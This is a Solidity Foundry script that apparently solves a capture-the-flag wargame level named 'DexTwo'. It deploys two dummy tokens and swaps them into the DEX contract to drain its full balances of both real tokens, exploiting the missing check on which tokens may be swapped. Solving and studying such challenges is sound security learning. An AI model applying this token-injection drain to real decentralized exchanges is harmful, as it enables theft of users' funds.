// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {DexTwo, SwappableTokenTwo} from "../../src/23/Dex2.sol";

contract Dex2Script is Script{
    function run() public{
        address dexAddrr = 0xBd94DA13940eb68995bCa883F787271d5316d53F;
        DexTwo dex = DexTwo(dexAddrr);
        address token1 = dex.token1();
        address token2 = dex.token2();

        vm.startBroadcast();

        SwappableTokenTwo token3 = new SwappableTokenTwo(dexAddrr, "token3", "t3", 1000);
        token3.transfer(dexAddrr, 1);
        token3.approve(0xF93eE28F72069752A808bbF56f9dB51952475AE0, address(dex), 500);

        SwappableTokenTwo token4 = new SwappableTokenTwo(dexAddrr, "token4", "t4", 1000);
        token4.transfer(dexAddrr, 1);
        token4.approve(0xF93eE28F72069752A808bbF56f9dB51952475AE0, address(dex), 500);

        dex.swap(address(token3), token1, 1);
        dex.swap(address(token4), token2, 1);

        vm.stopBroadcast();

        console.log(dex.balanceOf(token1, address(dex)));
        console.log(dex.balanceOf(token2, address(dex)));
    }
}